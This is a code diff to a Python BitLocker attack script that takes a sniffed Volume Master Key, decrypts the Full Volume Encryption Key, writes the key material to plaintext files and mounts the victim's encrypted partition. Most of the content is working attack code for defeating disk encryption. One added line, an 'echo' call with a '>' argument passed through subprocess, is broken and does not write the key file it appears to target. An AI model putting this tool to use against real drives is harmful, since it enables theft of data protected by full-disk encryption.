@@ -20,6 +20,7 @@ from sys import exit, stdout
 exit_flag = False
 vmk = bytes()
 aeskey = ""
+results = []
 
 # some definitions
 VMK_FILE = "vmk.bin"
@@ -115,6 +116,7 @@ class DataThread(threading.Thread):
         """Process the received data"""
         global exit_flag
         global vmk
+        global results
 
         print("[*] Start sniffing")
 
@@ -142,6 +144,8 @@ class DataThread(threading.Thread):
                         # show found BitLocker Volume Master Key
                         print(ef.bold + fg.green + "\n[+] Found BitLocker VMK: {}".format(self.key.hex()) + fg.rs)
                         vmk = self.key
+                        results.append("Bitlocker VMK:")
+                        results.append(("{}".format(self.key.hex()) + fg.rs))
                         # save sniffer VMK to file
                         with open(VMK_FILE, "wb") as f:
                             f.write(self.key)
@@ -162,6 +166,7 @@ def extract_metadata(drive):
 
 def fvekdecrypt(data, vmk):
     global aeskey
+    global results
     # data = metadata
     i = 0
     for l in data:
@@ -192,12 +197,17 @@ def fvekdecrypt(data, vmk):
     nonce = unhexlify(noncehex.replace(" ", ""))
 
     print(fg.li_blue + "[+] Extracted nonce:\n    {}".format(nonce.hex()) + fg.rs)
+    results.append("Extracted nonce:")
+    results.append(("{}".format(nonce.hex()) + fg.rs))
 
     # read MAC
     machex = fvek_data[9].split("[INFO]")[1].split("'")[0]
     mac = unhexlify(machex.replace(" ", ""))
 
     print(fg.li_blue + "[+] Extracted MAC:\n    {}".format(mac.hex()) + fg.rs)
+
+    results.append("Extracted MAC:")
+    results.append(("{}".format(mac.hex()) + fg.rs))
 
     # read payload (encrypted FVEK)
     payload_size = size - len(nonce) - len(mac)
@@ -213,6 +223,9 @@ def fvekdecrypt(data, vmk):
 
     print(fg.li_blue + "[+] Extracted payload:\n    {}".format(encrypted_fvek.hex()) + fg.rs)
 
+    results.append("Extracted payload:")
+    results.append(("{}".format(encrypted_fvek.hex()) + fg.rs))
+
     # initialize AES-CCM with given VMK and nonce
     cipher = AES.new(vmk, AES.MODE_CCM, nonce=nonce)
 
@@ -223,6 +236,9 @@ def fvekdecrypt(data, vmk):
         print(fg.li_yellow + "[+] Decrypted Full Volume Encryption Key (FVEK):\n    {}".format(
             decrypted_fvek.hex()) + fg.rs)
         aeskey = ("{}".format(decrypted_fvek.hex()) + fg.rs)
+
+        results.append("Decrypted Full Volume Encryption Key (FVEK):")
+        results.append(aeskey)
 
         # write FVEK file for use with dislocker
         with open(FVEK_FILE, "wb") as f:
@@ -236,20 +252,29 @@ def fvekdecrypt(data, vmk):
 
 
 def mountNgo(drive):
-    print(aeskey)
-    print("<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>")
+    global aeskey
+
+    aeskey = aeskey[:64]
+    print("[+] Attempting to mount the encrypted drive: %s" % drive)
+
+    subprocess.run(['echo', aeskey, '>' , "key.txt"], stdout=subprocess.PIPE)
 
     #decrypt and mount the bitlocker partition
     subprocess.run(['sudo', 'bdemount', '-k', aeskey, drive, "/mnt/bitlocker"], stdout=subprocess.PIPE)
-
-    #wait for 5 seconds for the mount
-    time.sleep(5)
 
     #mount the decrypted partition
     subprocess.run(['sudo', 'mount', '-o', "rw", "/mnt/bitlocker/bde1", "/mnt/ntfs"], stdout=subprocess.PIPE)
 
     #print the file structure of the the encrypted drive
     subprocess.call('ls /mnt/ntfs/', shell=True)
+
+def save_results():
+    with open('sniffing_results.txt', 'w') as f:
+        for line in results:
+            f.write('%s\n' % line)
+
+    print(ef.bold + fg.green + "\n[+] Results saved to -> sniffing_results.txt")
+
 
 
 def main(args):
@@ -279,11 +304,13 @@ def main(args):
     # decrypt the key
     fvekdecrypt(data, vmk)
 
-    print(aeskey)
-    print("<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>")
 
-    # decrypt the encrypted drive and mount it
+    # save the results to a txt file to use with mounter.py
+    save_results()
+
     mountNgo(drive)
+
+
 
 
 # main program
@@ -291,8 +318,8 @@ if __name__ == '__main__':
     # init command line parser
     parser = argparse.ArgumentParser("./nameofscript.py")
     parser.add_argument('-d', '--drive', type=str, required=True,
-                        help='The Bitlocker Encrypted drive. Usually located in /dev and has the identifier sxxy where x are letters and y a number. Select the encrypted partition')
-    # parser.add_argument('-k', '--keyfile', type=str, required=True, help='File with sniffed BitLocker Volume Master Key (VMK)')
+                        help='The Bitlocker encrypted partition. Usually located in /dev and has the identifier sdxy where x is a letter and y a number.')
+
 
     # parse command line arguments
     args = parser.parse_args()
